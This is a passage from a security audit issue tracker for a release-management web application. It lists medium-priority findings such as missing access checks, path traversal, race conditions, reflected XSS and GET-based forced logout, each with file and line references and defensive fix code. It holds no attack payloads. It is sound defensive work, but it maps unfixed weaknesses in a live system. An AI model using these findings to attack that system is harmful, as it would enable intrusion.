In `atr/storage/writers/vote.py` (lines 89-135) and `atr/shared/voting.py` (lines 20-33), vote duration is not validated against the release policy's min_hours constraint.

### Recommended Remediation
Validate vote duration against release policy:

```python
async def start(self, vote_duration_choice: int, vote_result_choice: str, email_to: str) -> sql.Task:
    policy = self.__release.release_policy or self.__release.project.release_policy
    if policy and policy.min_hours:
        if vote_duration_choice < policy.min_hours:
            raise storage.AccessError(
                f"Vote duration ({vote_duration_choice}h) must be at least {policy.min_hours}h per release policy"
            )
    if vote_duration_choice > 720:
        raise storage.AccessError("Vote duration cannot exceed 720 hours")
    if vote_duration_choice < 1:
        raise storage.AccessError("Vote duration must be at least 1 hour")
    # ... proceed
```

### Acceptance Criteria
- [ ] Vote duration validated against policy min_hours
- [ ] Appropriate error when duration below minimum
- [ ] Unit tests verifying policy enforcement

### References
- Source reports: L2:2.2.3.md
- ASVS sections: 2.2.3

### Priority
Medium

---

## Issue: FINDING-168 - Missing `session.check_access` in Distribution POST Endpoints

**Labels:** bug, security, priority:medium, asvs-level:L2

**ASVS Level(s):** L2-only

**Description:**

### Summary
Three distribution POST endpoints (`record_selected`, `stage_automate_selected`, `stage_record_selected`) lack the `session.check_access(project_key)` call present in other endpoints in the same file, creating inconsistent authorization enforcement. While the storage layer still enforces authorization, handler-level checks provide earlier rejection and clearer audit trails.

### Details
In `atr/post/distribution.py`, three endpoints (lines 159, 170, 183) are missing the session.check_access() call that other endpoints in the same file use for consistent authorization enforcement.

### Recommended Remediation
Add `await session.check_access(project_key)` to all three missing endpoints:

```python
async def record_selected(session, project_key, version_key, distribution_form):
    await session.check_access(project_key)  # ← Add this
    async with storage.write() as write:
        wacp = write.as_committee_participant(project_key)
        # ... operations
```

### Acceptance Criteria
- [ ] session.check_access() added to record_selected
- [ ] session.check_access() added to stage_automate_selected
- [ ] session.check_access() added to stage_record_selected
- [ ] Unit tests verifying authorization enforcement

### References
- Source reports: L2:2.2.3.md
- ASVS sections: 2.2.3

### Priority
Medium

---

## Issue: FINDING-169 - Committee Association Without Server-Side Membership Verification

**Labels:** bug, security, priority:medium, asvs-level:L2

**ASVS Level(s):** L2-only

**Description:**

### Summary
The `details` endpoint allows users to associate their OpenPGP key with committees without server-side verification of committee membership, unlike the `add` endpoint which correctly validates. A user can associate their OpenPGP key with arbitrary committees by modifying the POST body, creating false trust relationships in the database. This could allow unauthorized signing of releases or other committee-specific operations.

### Details
In `atr/post/keys.py` (lines 82-102), the details endpoint does not validate that the user is a member of the committees they select, allowing arbitrary committee associations.

### Recommended Remediation
Validate user is a participant of all submitted committees:

```python
async def details(session, _keys_details, fingerprint, update_form):
    selected_committee_keys = update_form.selected_committees
    allowed_committee_keys = set(session.committees + session.projects)
    unauthorized = set(selected_committee_keys) - allowed_committee_keys
    if unauthorized:
        await quart.flash(f"You are not a member of: {', '.join(unauthorized)}", "error")
        return await session.redirect(get.keys.details, fingerprint=key_fingerprint)
    # ... proceed with update
```

### Acceptance Criteria
- [ ] Committee membership validation implemented
- [ ] Unauthorized committee associations rejected
- [ ] Error message displayed for unauthorized committees
- [ ] Unit tests verifying validation

### References
- Source reports: L2:2.2.3.md
- ASVS sections: 2.2.3

### Priority
Medium

---

## Issue: FINDING-170 - Upload Session Not Validated Against Project/Version Context

**Labels:** bug, security, priority:medium, asvs-level:L2

**ASVS Level(s):** L2-only

**Description:**

### Summary
Upload sessions are not scoped to specific project/version combinations, allowing files staged for one project to be finalized into another if the user has access to both. Files staged for one project/version could be finalized into another project/version, potentially mixing release artifacts or contaminating releases with wrong files.

### Details
In `atr/post/upload.py` (lines 39, 107), upload sessions lack project/version context validation, allowing cross-project/version finalization.

### Recommended Remediation
Store project/version metadata with the upload session and validate in finalise endpoint:

```python
# In start endpoint - store metadata
metadata = {
    "project_key": str(project_key),
    "version_key": str(version_key),
    "asf_uid": session.asf_uid,
    "created_at": datetime.datetime.now(datetime.UTC).isoformat(),
}
metadata_file.write_text(json.dumps(metadata))

# In finalise endpoint - validate
if metadata["project_key"] != str(project_key):
    raise exceptions.BadRequest("Upload session project mismatch")
if metadata["version_key"] != str(version_key):
    raise exceptions.BadRequest("Upload session version mismatch")
```

### Acceptance Criteria
- [ ] Upload session metadata includes project/version
- [ ] Finalise endpoint validates project/version match
- [ ] Mismatched finalization is rejected with error
- [ ] Unit tests verifying validation

### References
- Source reports: L2:2.2.3.md
- ASVS sections: 2.2.3

### Priority
Medium

---

## Issue: FINDING-171 - Missing Release Phase Validation When Setting Revision Tags

**Labels:** bug, security, priority:medium, asvs-level:L2

**ASVS Level(s):** L2-only

**Description:**

### Summary
The `_set_tag` endpoint allows modifying revision tags without validating the release phase, unlike `_set_revision` which correctly restricts operations to DRAFT/PREVIEW phases. Revision tags can be modified on finalized releases, undermining audit integrity and potentially allowing post-release tampering with release metadata.

### Details
In `atr/post/revisions.py` (lines 93-109), the _set_tag endpoint lacks phase validation present in the related _set_revision endpoint.

### Recommended Remediation
Add phase validation to `_set_tag`:

```python
async def _set_tag(session, project_key, version_key, revision_number, tag):
    release = await session.release(project_key, version_key, phase=None, data=data)
    if release.phase not in {
        sql.ReleasePhase.RELEASE_CANDIDATE_DRAFT,
        sql.ReleasePhase.RELEASE_PREVIEW,
    }:
        raise base.ASFQuartException(
            "Cannot modify tags for releases past draft/preview phase"
        )
    # ... proceed with update
```

### Acceptance Criteria
- [ ] Phase validation added to _set_tag endpoint
- [ ] Tag modification blocked for finalized releases
- [ ] Appropriate error message for invalid phase
- [ ] Unit tests verifying phase enforcement

### References
- Source reports: L2:2.2.3.md
- ASVS sections: 2.2.3

### Priority
Medium

---

## Issue: FINDING-172 - `trusted_jwt_for_dist` Does Not Cross-Validate Claimed `asf_uid`

**Labels:** bug, security, priority:medium, asvs-level:L2

**ASVS Level(s):** L2-only

**Description:**

### Summary
The `trusted_jwt_for_dist` function accepts a caller-supplied `asf_uid` parameter without validating it against the project's committee membership or the JWT payload. A GitHub workflow using a valid trusted publisher role could claim any `asf_uid` for audit logging or access control purposes, potentially misattributing actions in audit logs, bypassing user-specific restrictions, or impersonating committee members.

### Details
In `atr/db/interaction.py` (line 290), the function accepts asf_uid as a parameter without validating it against committee membership.

### Recommended Remediation
Validate asf_uid is a member of the project's committee:

```python
async def trusted_jwt_for_dist(publisher, jwt, asf_uid, project_key, version_key, revision_number, data):
    payload, asf_uid_from_jwt = await validate_trusted_jwt(publisher, jwt)
    if asf_uid_from_jwt is not None:
        raise InteractionError("Must use Trusted Publishing when specifying ASF UID")
    
    project = await data.project(project_key, _committee=True).demand(...)
    if project.committee:
        committee_members = await data.committee_participant(committee_key=project.committee.key).all()
        member_uids = {m.asf_uid for m in committee_members}
        if asf_uid not in member_uids:
            raise InteractionError(f"User {asf_uid} is not a member of committee {project.committee.key}")
    
    return payload, asf_uid, project, release
```

### Acceptance Criteria
- [ ] asf_uid validated against committee membership
- [ ] Non-member asf_uid is rejected
- [ ] Unit tests verifying membership validation

### References
- Source reports: L2:2.2.3.md
- ASVS sections: 2.2.3

### Priority
Medium

---

## Issue: FINDING-173 - Task Model Uses Unvalidated Path Components

**Labels:** bug, security, priority:medium, asvs-level:L2

**ASVS Level(s):** L2-only

**Description:**

### Summary
The `FileArgs` task model uses unvalidated `file_path` and `revision_number` strings to construct filesystem paths, bypassing the safe type system. Path traversal via malicious `revision_number` or `file_path` values could allow reading/writing SBOM files from other projects if task queue contents are compromised (e.g., via database injection or task manipulation).

### Details
In `atr/tasks/sbom.py` (lines 76, 110, 155, 180), the FileArgs model uses unvalidated strings for path construction that could enable path traversal.

### Recommended Remediation
Add validation to task model:

```python
class FileArgs(schema.Strict):
    project_key: str
    version_key: str
    revision_number: str
    file_path: str
    asf_uid: str | None = None

    @pydantic.model_validator(mode="after")
    def validate_path_components(self) -> "FileArgs":
        safe.ProjectKey(self.project_key)
        safe.VersionKey(self.version_key)
        safe.RevisionNumber(self.revision_number)
        safe.RelPath(self.file_path)
        return self
```

### Acceptance Criteria
- [ ] Path component validation added to FileArgs
- [ ] Malicious path values are rejected
- [ ] Unit tests verifying path traversal prevention

### References
- Source reports: L2:2.2.3.md
- ASVS sections: 2.2.3

### Priority
Medium

---

## Issue: FINDING-174 - Vote Minimum Duration Bypass via Falsy min_hours Value

**Labels:** bug, security, priority:medium, asvs-level:L2

**ASVS Level(s):** L2-only

**Description:**

### Summary
The vote outcome calculation uses the Python idiom `min_hours or None`, which converts falsy values (including 0) to None. When a project's min_hours policy is set to 0 (a valid setting to disable minimum duration), it's incorrectly treated as 'no policy', allowing votes to pass immediately without the default 72-hour minimum. This subverts policy intent and allows premature vote resolution.

### Details
In `atr/tabulate.py` (lines 77-84), the expression `min_hours or None` incorrectly treats 0 as "no policy" instead of "no minimum duration".

### Recommended Remediation
Replace `min_hours or None` with explicit None check: `if policy_min is not None: min_duration_hours = policy_min`. This ensures 0 is treated as a meaningful value (explicit 'no minimum') rather than being conflated with None (no policy). Add explicit handling for min_hours=0 case in duration calculation.

### Acceptance Criteria
- [ ] Explicit None check implemented for min_hours
- [ ] min_hours=0 treated as valid "no minimum" policy
- [ ] Default 72-hour minimum applied only when policy is None
- [ ] Unit tests verifying both 0 and None handling

### References
- Source reports: L2:2.3.2.md
- Related findings: ASVS-232-CRI-002
- ASVS sections: 2.3.2

### Priority
Medium

---

## Issue: FINDING-175 - No File Size Limit on Web Upload Staging Endpoint

**Labels:** bug, security, priority:medium, asvs-level:L2

**ASVS Level(s):** L2-only

**Description:**

### Summary
The web upload staging endpoint accepts files of arbitrary size without validation. Files are streamed directly to disk in 1 MiB chunks with no cumulative size checking, allowing authenticated users to exhaust staging volume storage. The endpoint writes files completely before any size validation occurs.

### Details
In `atr/post/upload.py` (lines 118-155), files are streamed to disk without size validation, allowing unbounded storage consumption.

### Recommended Remediation
Add MAX_UPLOAD_SIZE_BYTES configuration constant. Track cumulative bytes written during file streaming. Raise exceptions.PayloadTooLarge when limit exceeded. Delete partially written files on size limit violation. Consider implementing per-release or per-user storage quotas.

### Acceptance Criteria
- [ ] MAX_UPLOAD_SIZE_BYTES configuration added
- [ ] Cumulative size tracking during streaming
- [ ] PayloadTooLarge exception raised when exceeded
- [ ] Partial files cleaned up on limit violation
- [ ] Unit tests verifying size enforcement

### References
- Source reports: L2:2.3.2.md
- ASVS sections: 2.3.2

### Priority
Medium

---

## Issue: FINDING-176 - Release Start Creates Release Record and Revision in Separate Transactions

**Labels:** bug, security, priority:medium, asvs-level:L2

**ASVS Level(s):** L2-only

**Description:**

### Summary
Release creation uses two separate transactions: first to create the release record and commit it, then to create the initial revision via create_revision_with_quarantine(). If revision creation fails, the release persists with latest_revision_number = NULL.

### Details
In `atr/storage/writers/release.py` (lines 290-345), release creation commits the release record before creating the initial revision, leaving orphaned releases if revision creation fails.

### Recommended Remediation
Create release record but don't commit yet (use flush() to get release ID). Create initial revision within same transaction via create_revision_with_quarantine(). Commit both release and revision together. On exception, rollback and raise AccessError indicating failure to create release.

### Acceptance Criteria
- [ ] Release and revision creation in single transaction
- [ ] Both committed together or rolled back together
- [ ] No orphaned releases without revisions
- [ ] Unit tests verifying atomicity

### References
- Source reports: L2:2.3.3.md
- ASVS sections: 2.3.3

### Priority
Medium

---

## Issue: FINDING-177 - Quarantine Promotion Uses Separate Sessions for Revision Creation and Quarantine Cleanup

**Labels:** bug, security, priority:medium, asvs-level:L2

**ASVS Level(s):** L2-only

**Description:**

### Summary
Quarantine promotion uses two separate database sessions: one SafeSession for revision finalization, another session for quarantine record deletion. If the second session's commit fails, the revision exists but the quarantine record persists.

### Details
In `atr/tasks/quarantine.py` (lines 210-255), quarantine promotion uses separate sessions for revision creation and cleanup, creating inconsistent state if cleanup fails.

### Recommended Remediation
Use single session for both operations. Within the SafeSession context, call finalise_revision(), then merge the detached quarantine object into the session, delete it, and let SafeSession handle the single commit for both revision and cleanup.

### Acceptance Criteria
- [ ] Single session used for revision and cleanup
- [ ] Both operations committed atomically
- [ ] No orphaned quarantine records
- [ ] Unit tests verifying atomicity

### References
- Source reports: L2:2.3.3.md
- ASVS sections: 2.3.3

### Priority
Medium

---

## Issue: FINDING-178 - Post-Rename Operations in Revision Commit Have No Filesystem Rollback

**Labels:** bug, security, priority:medium, asvs-level:L2

**ASVS Level(s):** L2-only

**Description:**

### Summary
After renaming the temp directory to the final revision directory (point of no return), several operations occur outside the exception handler: chmod_directories, compute_classifications, write_files_data, and commit. If any of these fail, an orphaned revision directory remains on filesystem with no corresponding database record. The exception handler only cleans temp_dir, not the renamed directory.

### Details
In `atr/storage/writers/revision.py`, post-rename operations (lines 140-150, 155-165) occur outside exception handling, leaving orphaned directories if they fail.

### Recommended Remediation
Move all post-rename operations (chmod_directories, compute_classifications, write_files_data, commit) inside the try block. Update exception handler to clean up the renamed directory if it exists, otherwise clean temp_dir. Log errors when cleaning up failed revision directory.

### Acceptance Criteria
- [ ] Post-rename operations moved inside try block
- [ ] Exception handler cleans up renamed directory
- [ ] No orphaned revision directories
- [ ] Error logging for cleanup failures
- [ ] Unit tests verifying cleanup

### References
- Source reports: L2:2.3.3.md
- ASVS sections: 2.3.3

### Priority
Medium

---

## Issue: FINDING-179 - Key Deletion Committed Before KEYS File Regeneration

**Labels:** bug, security, priority:medium, asvs-level:L2

**ASVS Level(s):** L2-only

**Description:**

### Summary
Key deletion commits the database change (deleting the key record) before regenerating KEYS files for affected committees. If KEYS regeneration fails for some committees, those files contain references to the deleted key. The key is deleted and committed, then autogenerate_keys_file() is called for each committee, which can fail for some committees.

### Details
In `atr/storage/writers/keys.py` (lines 80-95), key deletion is committed before KEYS files are regenerated, creating inconsistency if regeneration fails.

### Recommended Remediation
Commit deletion (reversible operation first). Attempt KEYS regeneration with best-effort error tracking for each committee. Log warnings for regeneration failures. Consider returning partial success outcome indicating which committees failed to regenerate KEYS files.

### Acceptance Criteria
- [ ] Deletion committed before KEYS regeneration
- [ ] Regeneration failures logged as warnings
- [ ] Partial success outcome returned
- [ ] Unit tests verifying error handling

### References
- Source reports: L2:2.3.3.md
- Related findings: ASVS-233-MED-005
- ASVS sections: 2.3.3

### Priority
Medium

---

## Issue: FINDING-180 - Key-Committee Association Committed Before KEYS File Generation

**Labels:** bug, security, priority:medium, asvs-level:L2

**ASVS Level(s):** L2-only

**Description:**

### Summary
Key-committee association is committed to database before generating the KEYS file. If KEYS generation fails, the association exists in database but the key is not advertised in the KEYS file. This is less severe than the deletion case since the key exists and is valid, just not advertised.

### Details
In `atr/storage/writers/keys.py` (lines 245-270), key-committee association is committed before KEYS file generation, creating inconsistency if generation fails.

### Recommended Remediation
Commit association to database. Attempt KEYS regeneration with error handling. If autogenerated_outcome is Error, log the failure and return Error outcome indicating key was associated successfully but KEYS file regeneration failed, surfacing the issue to the user.

### Acceptance Criteria
- [ ] Association committed before KEYS generation
- [ ] Generation failures logged and surfaced to user
- [ ] Error outcome returned on generation failure
- [ ] Unit tests verifying error handling

### References
- Source reports: L2:2.3.3.md
- Related findings: ASVS-233-MED-004
- ASVS sections: 2.3.3

### Priority
Medium

---

## Issue: FINDING-181 - Project Creation Race Condition Between Existence Check and Insert

**Labels:** bug, security, priority:medium, asvs-level:L2

**ASVS Level(s):** L2-only

**Description:**

### Summary
Project creation uses check-then-create pattern with acknowledged race condition (TODO comment in code). Existence check is performed, then project insert. Concurrent requests could attempt to create the same project between the existence check and insert. Database unique constraint prevents duplication but error handling may not be user-friendly.

### Details
In `atr/storage/writers/project.py` (lines 132-165), project creation has a TODO comment acknowledging the race condition between existence check (lines 135-137) and insert.

### Recommended Remediation
Option 1: Catch IntegrityError - Skip existence check, rely on database constraint, catch IntegrityError and convert to user-friendly AccessError. Option 2: INSERT ON CONFLICT - Use SQLite INSERT ON CONFLICT DO NOTHING with RETURNING clause to atomically check and insert, raise AccessError if no row returned.

### Acceptance Criteria
- [ ] Race condition eliminated
- [ ] User-friendly error on duplicate project
- [ ] TODO comment removed
- [ ] Unit tests verifying concurrent creation handling

### References
- Source reports: L2:2.3.3.md
- ASVS sections: 2.3.3

### Priority
Medium

---

## Issue: FINDING-182 - Filesystem State Written Before Database Transaction Commit in Task Queuing

**Labels:** bug, security, priority:medium, asvs-level:L2

**ASVS Level(s):** L2-only

**Description:**

### Summary
Task queuing writes check cache data to filesystem before the task is committed to the database. attestable.write_checks_data() is called unconditionally before the task object is returned and persisted to DB. If database commit fails, filesystem contains checks data with no corresponding task.

### Details
In `atr/tasks/__init__.py`, the queued() function (lines 123-171) writes filesystem state before task commit (lines 218-241), creating inconsistency if commit fails.

### Recommended Remediation
Option 1 (Recommended): Defer Filesystem Write - Return task object and deferred write function from queued(). In draft_checks(), add all tasks, commit database first, then execute filesystem writes after commit succeeds. Option 2: Accept Window, Add Cleanup - Accept the window but add periodic cleanup task to remove check cache files for non-existent tasks.

### Acceptance Criteria
- [ ] Filesystem writes deferred until after database commit
- [ ] No orphaned check cache files
- [ ] Unit tests verifying write order

### References
- Source reports: L2:2.3.3.md
- ASVS sections: 2.3.3

### Priority
Medium

---

## Issue: FINDING-183 - Workflow Status Update and Next Schedule in Separate Transactions

**Labels:** bug, security, priority:medium, asvs-level:L2

**ASVS Level(s):** L2-only

**Description:**

### Summary
Workflow status checking updates pending workflow statuses in one transaction, then schedules the next check via _schedule_next() in a separate operation (new session). If scheduling fails, status updates persist but monitoring stops. This creates a silent failure where workflow monitoring stops without error.

### Details
In `atr/tasks/gha.py` (lines 65-110), workflow status updates and next check scheduling use separate sessions, creating silent monitoring failure if scheduling fails.

### Recommended Remediation
Use single session for both status updates and next check scheduling. After updating pending workflow statuses within the session, create the next status check task and add it to the same session. Perform single commit for updates + scheduling together.

### Acceptance Criteria
- [ ] Single session for updates and scheduling
- [ ] Both operations committed atomically
- [ ] No silent monitoring failures
- [ ] Unit tests verifying atomicity

### References
- Source reports: L2:2.3.3.md
- Related findings: ASVS-233-HIGH-004
- ASVS sections: 2.3.3

### Priority
Medium

---

## Issue: FINDING-184 - Session Cache Read-Modify-Write Race Condition

**Labels:** bug, security, priority:medium, asvs-level:L2

**ASVS Level(s):** L2-only

**Description:**

### Summary
Session cache operations use unlocked read-modify-write pattern despite the existence of atomic_modify_file() function in the same file that implements file-level locking with fcntl.flock. This is a Type B gap—the control exists but is not applied where needed. Multiple concurrent processes can read, modify, and write the session cache, leading to lost updates.

### Details
In `atr/util.py`, session cache operations (lines 457, 466) use unlocked read-modify-write while atomic_modify_file() (lines 156-170) exists but is not used.

### Recommended Remediation
Use the existing atomic_modify_file() function for session cache operations. Refactor session_cache_read() and session_cache_write() to use atomic_modify_file() which implements file-level locking with fcntl.flock, ensuring read-modify-write atomicity across processes.

### Acceptance Criteria
- [ ] Session cache uses atomic_modify_file()
- [ ] No race conditions in concurrent access
- [ ] Unit tests verifying concurrent access safety

### References
- Source reports: L2:2.3.3.md
- ASVS sections: 2.3.3

### Priority
Medium

---

## Issue: FINDING-185 - Project Creation Race Condition (TOCTOU)

**Labels:** bug, security, priority:medium, asvs-level:L2

**ASVS Level(s):** L2-only

**Description:**

### Summary
Project creation has check-then-act pattern without lock. The CommitteeMember.create() function checks for existing project, then inserts new project without holding a write lock between operations. This creates a time-of-check time-of-use vulnerability where concurrent requests can both pass the existence check and attempt insertion. Database unique constraint prevents actual duplication but produces unhandled IntegrityError (HTTP 500) instead of clean business logic error. Developer comment '# TODO: Fix the potential race condition here' acknowledges this known issue.

### Details
In `atr/storage/writers/project.py` (lines 127-160), check-then-create pattern exists without write lock, acknowledged by TODO comment.

### Recommended Remediation
Add begin_immediate() before existence check to acquire write lock: `await self.__data.begin_immediate()` before 'if await self.__data.project(key=label).get()'. This serializes the check-then-insert operation. The existing commit() at the end will release the write lock.

### Acceptance Criteria
- [ ] begin_immediate() added before existence check
- [ ] Race condition eliminated
- [ ] User-friendly error on duplicate project
- [ ] TODO comment removed
- [ ] Unit tests verifying concurrent creation handling

### References
- Source reports: L2:2.3.4.md
- Related findings: References correct pattern in revision.py:_lock_and_merge()
- ASVS sections: 2.3.4

### Priority
Medium

---

## Issue: FINDING-186 - Release Creation Lacks Explicit Business Logic Locking

**Labels:** bug, security, priority:medium, asvs-level:L2

**ASVS Level(s):** L2-only

**Description:**

### Summary
Release creation in CommitteeParticipant.start() has check-then-act pattern without explicit business logic lock. Function checks for existing release with phase-specific error messages, then inserts new release without holding lock between operations. Gap between SELECT check and INSERT allows concurrent requests to both pass validation and attempt insertion. Database unique constraint prevents actual duplication but produces unfriendly IntegrityError (HTTP 500) instead of phase-specific error message with guidance.

### Details
In `atr/storage/writers/release.py`, the start() function has check-then-create pattern without write lock between operations.

### Recommended Remediation
Add begin_immediate() before existence check to acquire write lock: `await self.__data.begin_immediate()` after committee project lookups and before 'if release := await self.__data.release(...)'. This serializes the check-then-insert operation and ensures phase-specific error messages are returned to users.

### Acceptance Criteria
- [ ] begin_immediate() added before existence check
- [ ] Race condition eliminated
- [ ] Phase-specific error messages preserved
- [ ] Unit tests verifying concurrent creation handling

### References
- Source reports: L2:2.3.4.md
- Related findings: References correct pattern in release.py:promote_to_candidate()
- ASVS sections: 2.3.4

### Priority
Medium

---

## Issue: FINDING-187 - GET-Based Logout Permits Cross-Origin Session Destruction

**Labels:** bug, security, priority:medium, asvs-level:L1, asvs-level:L2

**ASVS Level(s):** L1, L2

**Description:**

### Summary
The OAuth endpoint in `src/asfquart/generics.py` accepts GET requests for logout without CSRF protection or origin validation. While Sec-Fetch-Site validation is applied to POST requests, GET requests bypass this entirely. When a user requests /auth?logout via GET, the application executes `asfquart.session.clear()` (state-changing operation) and returns a Clear-Site-Data header instructing the browser to clear all cookies and storage. An attacker can force logout any authenticated user through image tags, link prefetch, hidden iframes, or cross-origin fetch. This violates ASVS 3.5.3's requirement that state-changing operations use POST/PUT/PATCH/DELETE methods.

### Details
In `src/asfquart/generics.py`, the auth endpoint (line 29, lines 56-85) accepts GET for logout, executing state-changing operations without CSRF protection.

### Recommended Remediation
**Option 1 (Recommended)**: Restrict logout to POST only by checking `if quart.request.method != "POST"` and returning 405 status with `Allow: POST` header before executing session.clear():

```python
elif logout_uri or quart.request.query_string == b"logout":
    if quart.request.method != "POST":
        return quart.Response(
            status=405,
            response="Use POST to logout\n",
            content_type="text/plain; charset=utf-8",
            headers={"Allow": "POST"},
        )
    had_session = bool(await asfquart.session.read())
    asfquart.session.clear()
    response = quart.Response(
        status=200,
        response=f"Logged out. Return to <a href='{base_url}'>front page</a>.\n",
        content_type="text/html; charset=utf-8",
    )
    if had_session:
        response.headers["Clear-Site-Data"] = '"cache", "cookies", "storage"'
    return response
```

### Acceptance Criteria
- [ ] Logout restricted to POST method only
- [ ] GET requests to logout return 405 Method Not Allowed
- [ ] Allow header includes only POST
- [ ] Unit tests verifying POST-only enforcement

### References
- Source reports: L1:3.5.1.md, L1:3.5.2.md, L1:3.5.3.md
- Related findings: FINDING-371
- ASVS sections: 3.5.1, 3.5.2, 3.5.3

### Priority
Medium

---

## Issue: FINDING-188 - Form Validation Error Messages Rendered as Unescaped HTML

**Labels:** bug, security, priority:medium, asvs-level:L1

**ASVS Level(s):** L1

**Description:**

### Summary
The flash_error_summary() function in `atr/form.py` constructs HTML error messages from Pydantic validation errors and wraps them with `markupsafe.Markup()`, which bypasses Jinja2's auto-escaping. When custom validators like to_enum() include user input in error messages, this creates a reflected XSS vulnerability. User input flows through validation error messages without HTML escaping before being inserted into HTML via f-strings, then wrapped with Markup() to bypass template auto-escaping.

### Details
In `atr/form.py` (lines 145-155), error messages containing user input are wrapped with Markup() and inserted into HTML without escaping.

### Recommended Remediation
Use `markupsafe.escape()` to escape both field_label and msg before HTML insertion in flash_error_summary():

```python
safe_label = markupsafe.escape(field_label)
safe_msg = markupsafe.escape(msg)
parts.append(f"<li><strong>{safe_label}</strong>: {safe_msg}</li>")
```

Also audit all custom Pydantic validators for user input reflection in error messages.

### Acceptance Criteria
- [ ] Error messages escaped before HTML insertion
- [ ] XSS via validation errors prevented
- [ ] Custom validators audited for user input in messages
- [ ] Unit tests verifying XSS prevention

### References
- Source reports: L1:3.2.2.md
- Related findings: FINDING-189
- ASVS sections: 3.2.2

### Priority
Medium

---

## Issue: FINDING-189 - Markdown-to-HTML Rendering Without Explicit Sanitization

**Labels:** bug, security, priority:medium, asvs-level:L1

**ASVS Level(s):** L1

**Description:**

### Summary
User-uploaded SBOM files contain vulnerability detail fields that are rendered as markdown and converted to HTML in `atr/get/sbom.py`. The resulting HTML is wrapped with `markupsafe.Markup()`, bypassing htpy's auto-escaping. While cmarkgfm's default behavior suppresses raw HTML, this is an implicit dependency without explicit sanitization. Safety depends entirely on cmarkgfm's default behavior, which could change between versions. Adding CMARK_OPT_UNSAFE in the future would immediately create an XSS vulnerability. No explicit HTML sanitization layer exists between markdown rendering and browser display.

### Details
In `atr/get/sbom.py` (lines 180-190), markdown is converted to HTML and wrapped with Markup() without explicit sanitization layer.

### Recommended Remediation
Add explicit HTML sanitization using nh3 or bleach after cmarkgfm markdown rendering:

```python
import nh3
ALLOWED_TAGS = {"p", "strong", "em", "a", "code", "pre", "ul", "ol", "li", "h1", "h2", "h3", "h4", "h5", "h6", "blockquote", "br", "hr", "table", "thead", "tbody", "tr", "th", "td", "img", "div", "span"}
ALLOWED_ATTRIBUTES = {"a": {"href", "title"}, "img": {"src", "alt", "title"}}
raw_html = cmarkgfm.github_flavored_markdown_to_html(vuln.details)
sanitized = nh3.clean(raw_html, tags=ALLOWED_TAGS, attributes=ALLOWED_ATTRIBUTES)
details = markupsafe.Markup(sanitized)
```

### Acceptance Criteria
- [ ] nh3 or bleach dependency added
- [ ] Explicit HTML sanitization after markdown rendering
- [ ] Allowed tags and attributes defined
- [ ] Unit tests verifying sanitization

### References
- Source reports: L1:3.2.2.md
- Related findings: FINDING-188
- ASVS sections: 3.2.2

### Priority
Medium

---

## Issue: FINDING-190 - Missing Global Security Headers on Development Vhost (tooling-vm-ec2-de.apache.org)

**Labels:** bug, security, priority:medium, asvs-level:L1, asvs-level:L2

**ASVS Level(s):** L1, L2

**Description:**

### Summary
The tooling-vm-ec2-de.apache.org virtual host is an internet-facing server with force_tls: true but lacks global security headers that are present on the release-test.apache.org vhost. Missing headers include Strict-Transport-Security (HSTS), X-Content-Type-Options, X-Frame-Options, and Referrer-Policy. This creates an inconsistent security posture between development and production environments. Without HSTS, the first HTTP request to the development server is vulnerable to SSL stripping attacks. Without X-Content-Type-Options, MIME-sniffing attacks are possible. Without Referrer-Policy, path information and the internal hostname leak to third parties.

### Details
In `tooling-vm-ec2-de.apache.org.yaml` (lines 120-175), the development vhost lacks security headers present in the staging vhost.

### Recommended Remediation
Add the same security headers block to the tooling-vm-ec2-de.apache.org vhost that exists in release-test.apache.org:

```yaml
tooling-vm-ec2-de.apache.org:
    force_tls: true
    config: |
        # Security Headers (match release-test.apache.org)
        Header always set Strict-Transport-Security "max-age=63072000; includeSubDomains"
        Header always set X-Content-Type-Options "nosniff"
        Header always set X-Frame-Options "DENY"
        Header always set Referrer-Policy "same-origin"
```

### Acceptance Criteria
- [ ] Security headers added to development vhost
- [ ] Headers match staging vhost configuration
- [ ] Deployment verified on development server
- [ ] Header presence confirmed via curl/browser

### References
- Source reports: L1:3.4.1.md, L2:3.4.4.md, L2:3.4.5.md
- Related findings: FINDING-191, FINDING-192, FINDING-370
- ASVS sections: 3.4.1, 3.4.4, 3.4.5

### Priority
Medium

---

## Issue: FINDING-191 - Application Does Not Set Security Headers (HSTS, X-Content-Type-Options, Referrer-Policy)

**Labels:** bug, security, priority:medium, asvs-level:L1, asvs-level:L2

**ASVS Level(s):** L1, L2

**Description:**

### Summary
The application's add_security_headers() after_request handler sets CSP, Permissions-Policy, and X-Permitted-Cross-Domain-Policies directly on responses, but delegates HSTS, X-Content-Type-Options, X-Frame-Options, and Referrer-Policy entirely to the frontend Apache httpd proxy. While the proxy correctly sets these headers for the staging vhost, setting them at the application level as well would provide defense-in-depth against proxy misconfiguration. Impact is minimal given current architecture as backend containers bind to 127.0.0.1 only, external clients cannot bypass the proxy, and the delegation is intentionally documented with audit_guidance comments.

### Details
In `atr/server.py` (lines 445-455, 318-326), security headers are delegated to the proxy without application-level backup.

### Recommended Remediation
Add the delegated headers directly in the application as well:

```python
@app.after_request
async def add_security_headers(response: quart.Response) -> quart.Response:
    response.headers["Content-Security-Policy"] = csp_header
    response.headers["Permissions-Policy"] = permissions_policy
    response.headers["X-Permitted-Cross-Domain-Policies"] = "none"
    # Add defense-in-depth headers (proxy will override with 'Header always set')
    response.headers["Strict-Transport-Security"] = "max-age=63072000; includeSubDomains"
    response.headers["X-Content-Type-Options"] = "nosniff"
    response.headers["X-Frame-Options"] = "DENY"
    response.headers["Referrer-Policy"] = "same-origin"
    return response
```

Note: The proxy's `Header always set` directive will override the application-level header, so there is no conflict. The application-level header acts as a safety net.

### Acceptance Criteria
- [ ] Application-level security headers added
- [ ] Headers documented as defense-in-depth
- [ ] No conflicts with proxy headers
- [ ] Unit tests verifying header presence

### References
- Source reports: L1:3.4.1.md, L2:3.4.4.md, L2:3.4.5.md
- Related findings: FINDING-190
- ASVS sections: 3.4.1, 3.4.4, 3.4.5

### Priority
Medium

---

## Issue: FINDING-192 - Missing CSP frame-ancestors for Non-Proxied /downloads/ Paths

**Labels:** bug, security, priority:medium, asvs-level:L2

**ASVS Level(s):** L2-only

**Description:**

### Summary
